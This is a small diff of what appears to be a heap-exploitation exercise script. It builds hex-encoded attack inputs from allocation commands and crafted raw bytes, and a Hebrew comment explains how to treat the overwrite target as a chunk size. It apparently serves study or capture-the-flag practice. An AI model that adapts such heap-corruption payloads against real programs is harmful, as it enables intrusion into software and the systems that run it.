@@ -58,12 +58,14 @@ input6 = (b'new '+b'\xf2\x43'+ b'\x3c\x53'+ b'\xff\x0b' +b'\x44' + b' 0;').hex()
 #וזאת אותה טכניקה כמו באלגירס. להתייחס למקום שנרצה לשנות כגודל של צאנק
 
 input7 = (b'new a 0;').hex()
-input8 = (b'new b 0;').hex()
-input9 = (b'new c 0;').hex()
-input10 = (b'new d 0;').hex()
-input11 = (b'new e 0;').hex() 
+input8 = (b'new a 0;').hex()
+input9 = (b'new b 0;').hex()
+input10 = (b'new b 0;').hex()
+input11 = (b'new c 0;').hex()
 
-input1 + input2 + input3 + input4 + input5 +input6 +input7 + input8 + input9 + input10 + input11
+input12 = (b'new c 0;').hex() # after rehash.
+
+input1 + input2 + input3 + input4 + input5 +input6 +input7 + input8 + input9 + input10 + input11 + input12
 ```
 
 
